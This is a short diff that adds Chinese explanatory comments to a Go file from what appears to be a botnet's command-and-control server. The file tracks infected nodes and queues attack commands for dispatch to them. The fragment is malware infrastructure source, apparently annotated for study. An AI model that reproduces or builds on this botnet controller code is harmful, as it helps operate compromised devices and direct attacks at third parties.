@@ -1,5 +1,8 @@
 package main
 
+ //管理感染的结点
+
+ 
 import (
     "time"
     "math/rand"
@@ -19,7 +22,7 @@ type ClientList struct {
     clients     map[int]*Bot
     addQueue    chan *Bot
     delQueue    chan *Bot
-    atkQueue    chan *AttackSend
+    atkQueue    chan *AttackSend  //攻击数据的队列
     totalCount  chan int
     cntView     chan int
     distViewReq chan int
@@ -63,7 +66,7 @@ func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
     this.atkQueue <- attack
 }
 
-func (this *ClientList) fastCountWorker() {
+func (this *ClientList) fastCountWorker() {   //ClientList的fastCountWorker方法
     for {
         select {
         case delta := <-this.totalCount:
@@ -76,7 +79,7 @@ func (this *ClientList) fastCountWorker() {
     }
 }
 
-func (this *ClientList) worker() {
+func (this *ClientList) worker() {  //ClientList 的worker方法
     rand.Seed(time.Now().UTC().UnixNano())
 
     for {
